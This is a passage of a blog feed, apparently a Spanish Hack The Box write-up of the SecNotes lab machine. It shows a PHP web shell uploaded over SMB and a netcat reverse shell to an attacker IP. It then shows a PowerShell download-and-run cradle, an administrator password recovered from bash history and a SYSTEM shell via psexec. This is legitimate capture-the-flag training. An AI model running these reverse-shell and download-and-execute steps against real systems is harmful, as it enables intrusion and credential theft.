+putting file shell.php as &lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;hell.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.2 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 1.7 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si tratamos de ejecutar un comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-secnotes/secnotes-web16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que nos queda es ingresar al sistema mediante una reverse shell haciendo uso del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt;, por lo que tambíen lo subimos al sistema, nos ponemos en escucha por el puerto 443 y ejecutamos nuestra reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; put nc.exe
+putting file nc.exe as &lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49.2 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 7.5 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Sun Dec 26 18:52:25 2021
+  ..                                  D        0  Sun Dec 26 18:52:25 2021
+  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
+  nc.exe                              A    28160  Sun Dec 26 18:52:26 2021
+  shell.php                           A       65  Sun Dec 26 18:50:33 2021
+
+                7736063 blocks of size 4096. 3397277 blocks available
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.97:8808/shell.php?cmd=nc.exe -e cmd 10.10.14.27 443&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.97] 51477
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17134.228]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;secnotes&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler
+
+C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;ew-site&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos en la máquina como el usuario &lt;strong&gt;tyler&lt;/strong&gt; y podemos visualizar la flag (user.txt). Por lo que ahora nos falta escalar privilegios; por lo que si accedemos al escritorio del usuario &lt;strong&gt;tyler&lt;/strong&gt; vemos que tiene un archivo curioso llamando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash.lnk&lt;/code&gt;, es decir, un hipervínculo. Para obtener el origen de dicho archivo, vamos a obtener una reverse shell con powershell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+ &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+
+08/19/2018  02:51 PM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+08/19/2018  02:51 PM    &amp;lt;DIR&amp;gt;          ..
+06/22/2018  02:09 AM             1,293 bash.lnk
+08/02/2021  02:32 AM             1,210 Command Prompt.lnk
+04/11/2018  03:34 PM               407 File Explorer.lnk
+06/21/2018  04:50 PM             1,417 Microsoft Edge.lnk
+06/21/2018  08:17 AM             1,110 Notepad++.lnk
+12/26/2021  04:14 PM                34 user.txt
+08/19/2018  09:59 AM             2,494 Windows PowerShell.lnk
+               7 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          7,965 bytes
+               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  13,913,157,632 bytes free
+
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo que primero, vamos a buscar nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt;, lo traemos a nuestro directorio de trabajo y al final del archivo, agregamos la linea &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 443&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ locate Invoke-PowerShellTcp
+/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
+❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos compartimos un servidor HTTP con python, nos ponemos en escucha por el puerto 443 y procedemos a entablarnos una reverse shell en powershell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.97 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;26/Dec/2021 19:23:03] &lt;span class=&quot;s2&quot;&gt;&quot;GET /PS.ps1 HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; powershell IEX&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.downloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.14.27/PS.ps1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.97] 53148
+Windows PowerShell running as user SECNOTES&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;on SECNOTES
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;secnotes&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora, vamos a crear un objecto llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wscript&lt;/code&gt; y la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shortcut&lt;/code&gt; que nos ayudarán a obtener información sobre el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash.lnk&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nv&quot;&gt;$Wscript&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object &lt;span class=&quot;nt&quot;&gt;-ComObject&lt;/span&gt; Wscript.Shell
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nv&quot;&gt;$shortcut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-ChildItem bash.lnk
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nv&quot;&gt;$Wscript&lt;/span&gt;.CreateShortcut&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$shortcut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+
+FullName         : C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ash.lnk
+Arguments        : 
+Description      : 
+Hotkey           : 
+IconLocation     : ,0
+RelativePath     : 
+TargetPath       : C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ash.exe
+WindowStyle      : 1
+WorkingDirectory : C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32
+
+
+
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;yler&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aqui vemos que la ruta del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; es bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\System32\bash.exe&lt;/code&gt; y solo para confirmar, vamos a realizar una búsqueda recursiva en la raiz por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash.exe&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; Get-ChildItem &lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Filter&lt;/span&gt; bash.exe &lt;span class=&quot;nt&quot;&gt;-Recurse&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ErrorAction&lt;/span&gt; SilentlyContinue &lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;
+
+
+    Directory: C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;inSxS&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;md64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5
+
+
+Mode                LastWriteTime         Length Name                                                                  
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                  
+&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        6/21/2018   3:02 PM         115712 bash.exe                                                              
+
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con el comando anterior, vemos que el archivo está realmente bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5&lt;/code&gt;. Ahora, pensando un poco, existe un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash.exe&lt;/code&gt; y si vemos los directorios en la raiz &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt;, existe uno como se llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Distros&lt;/code&gt; y un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ubuntu.zip&lt;/code&gt;; por lo que ya nos hace pensar que tal vez exista un servidor Ubuntu ejecutandose en la máquina y con el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash.exe&lt;/code&gt; podríamos acceder a dicho servidor.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir
+ &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+
+06/21/2018  02:07 PM    &amp;lt;DIR&amp;gt;          Distros
+06/21/2018  05:47 PM    &amp;lt;DIR&amp;gt;          inetpub
+06/22/2018  01:09 PM    &amp;lt;DIR&amp;gt;          Microsoft
+04/11/2018  03:38 PM    &amp;lt;DIR&amp;gt;          PerfLogs
+06/21/2018  07:15 AM    &amp;lt;DIR&amp;gt;          php7
+01/26/2021  02:39 AM    &amp;lt;DIR&amp;gt;          Program Files
+01/26/2021  02:38 AM    &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+06/21/2018  02:07 PM       201,749,452 Ubuntu.zip
+06/21/2018  02:00 PM    &amp;lt;DIR&amp;gt;          Users
+01/26/2021  02:38 AM    &amp;lt;DIR&amp;gt;          Windows
+               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    201,749,452 bytes
+               9 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  13,910,695,936 bytes free
+
+C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por lo tanto, vamos a ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe&lt;/code&gt; para ver que pasa.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;inSxS&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;md64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ash.exe
+mesg: ttyname failed: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
+Script started, file is /dev/null
+root@SECNOTES:~# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+root@SECNOTES:~# ll
+total 8
+drwx------ 1 root root  512 Jun 22  2018 ./
+drwxr-xr-x 1 root root  512 Jun 21  2018 ../
+&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt; 1 root root  398 Jun 22  2018 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 3112 Jun 22  2018 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  148 Aug 17  2015 .profile
+drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem/
+root@SECNOTES:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/c/
+&lt;span class=&quot;nb&quot;&gt;ls
+cd &lt;/span&gt;Users/
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
+&lt;span class=&quot;nb&quot;&gt;ls
+pwd
+mkdir &lt;/span&gt;filesystem
+mount //127.0.0.1/c&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;filesystem/
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;cifs-utils
+mount //127.0.0.1/c&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;filesystem/
+mount //127.0.0.1/c&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;filesystem/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;administrator
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/filesystems
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;modprobe cifs
+smbclient
+apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;smbclient
+smbclient
+smbclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator%u6!4ZwgwOM#^OBf#Nwnh'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;127.0.0.1&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;c&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; .bash_history 
+less .bash_history
+exitroot@SECNOTES:~#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si checamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt;, podemos ver los comandos a ha hecho el usuario &lt;strong&gt;root&lt;/strong&gt; del servidor Ubuntu y nos encontramos con algo curioso, unas credenciales del usuario &lt;strong&gt;Administrator&lt;/strong&gt;, por lo que ya sabemos, guardamos todas las credenciales que encontremos y vamos a validarlas.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.97 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'u6!4ZwgwOM#^OBf#Nwnh'&lt;/span&gt;
+SMB         10.10.10.97     445    SECNOTES         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10 Enterprise 17134 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SECNOTES&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:SECNOTES&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.10.97     445    SECNOTES         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] SECNOTES&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator:u6!4ZwgwOM#^OBf#Nwnh &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Las credenciales son válidas y tenemos ejecución de comandos (&lt;em&gt;Pwn3d!&lt;/em&gt;),  por lo tanto, nos conectamos a la máquina con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ /root/.local/pipx/venvs/crackmapexec/bin/psexec.py WORKGROUP/Administrator:u6&lt;span class=&quot;se&quot;&gt;\!&lt;/span&gt;4ZwgwOM#^OBf#Nwnh@10.10.10.97
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.97.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file bseZoTmQ.exe
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.97.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service ZuAc on 10.10.10.97.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service ZuAc.....
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17134.228]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="CSRF" /><category term="Windows" /><category term="SQL" /><category term="PHP" /><category term="Powershell" /><category term="SQLi" /><category term="Web" /><summary type="html">Resolución de la máquina SecNotes en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Shocker</title><link href="http://localhost:4000/htb-shocker/" rel="alternate" type="text/html" title="Hack The Box Shocker" /><published>2021-12-16T00:00:00-06:00</published><updated>2021-12-16T00:00:00-06:00</updated><id>http://localhost:4000/htb-shocker</id><content type="html" xml:base="http://localhost:4000/htb-shocker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-shocker/banner-shocker.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;shocker&quot;&gt;Shocker&lt;/h2&gt;
